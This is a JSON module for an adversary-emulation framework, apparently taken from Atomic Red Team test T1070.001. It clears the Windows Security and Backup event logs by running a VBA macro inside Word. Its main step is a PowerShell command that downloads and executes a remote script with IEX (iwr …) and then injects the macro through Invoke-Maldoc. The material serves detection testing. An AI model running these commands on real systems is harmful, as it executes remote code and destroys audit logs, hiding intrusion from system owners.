{
  "id": "1b682d84-f075-4f93-9a89-8a8de19ffd6e",
  "name": "Clear Event Logs via VBA",
  "description": "This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. \n\nElevation is required for this module to execute properly, otherwise WINWORD will throw an \"Access Denied\" error\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "bd9419f5-bac0-4aec-a989-2a787f4c1c19",
      "type": "execute-command",
      "data": {
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "42bee20c-2bed-44fe-b33e-5b23b8051d36",
      "name": "Check dependency 1/1",
      "description": "Microsoft Word must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "b9dc6a28-da68-4fdb-9e4a-d370542f096e",
      "name": "Resolve dependency 1/1",
      "description": "Microsoft Word must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "19396d53-444f-496a-afb8-d60c74c1161f",
      "name": "Re-check dependency 1/1",
      "description": "Microsoft Word must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "42bee20c-2bed-44fe-b33e-5b23b8051d36",
      "p": "on-success",
      "o": "bd9419f5-bac0-4aec-a989-2a787f4c1c19"
    },
    {
      "s": "42bee20c-2bed-44fe-b33e-5b23b8051d36",
      "p": "on-failure",
      "o": "b9dc6a28-da68-4fdb-9e4a-d370542f096e"
    },
    {
      "s": "b9dc6a28-da68-4fdb-9e4a-d370542f096e",
      "p": "on-success",
      "o": "19396d53-444f-496a-afb8-d60c74c1161f"
    },
    {
      "s": "19396d53-444f-496a-afb8-d60c74c1161f",
      "p": "on-failure",
      "o": "bd9419f5-bac0-4aec-a989-2a787f4c1c19"
    }
  ],
  "tags": [
    "T1070.001",
    "atomic-red-team"
  ]
}